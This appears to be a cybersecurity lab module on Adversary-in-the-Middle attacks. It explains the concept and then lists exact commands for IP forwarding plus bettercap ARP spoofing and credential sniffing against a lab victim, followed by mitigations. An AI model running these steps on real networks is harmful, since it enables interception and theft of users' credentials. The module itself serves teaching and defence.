# Module: Adversary-in-the-Middle (AITM)

1. Core Concept 🧠

Adversary-in-the-Middle (AITM) (formerly Man-in-the-Middle / MITM) happens when an attacker secretly intercepts, relays, and possibly alters communications between two parties who believe they are communicating directly.

Real-world analogy: You write a letter to your bank and give it to the postman. The postman secretly opens it, reads your account number, seals it, and delivers it. You and the bank have no idea he read it.

# 10.10.10.2 (Victim Client), 10.10.10.1 (Router), 10.10.10.10 (You)

Attack Steps

  1. Enable Forwarding: sysctl -w net.ipv4.ip_forward=1
  2. Start Bettercap: bettercap -iface eth0
  3. Inside Bettercap, start probation: net.probe on
  4. Set ARP spoofing parameters: set arp.spoof.targets 10.10.10.2
  5. Start the attack: arp.spoof on
  6. Enable the credential sniffer: net.sniff on
  7. Wait for the automated victim container to browse to the mock HTTP site. Watch the plaintext credentials appear on your screen!

Fix / Mitigation

Use HTTPS (TLS) everywhere to encrypt data in transit. At the network level, use Dynamic ARP Inspection (DAI) on enterprise switches to validate ARP packets against a trusted database.
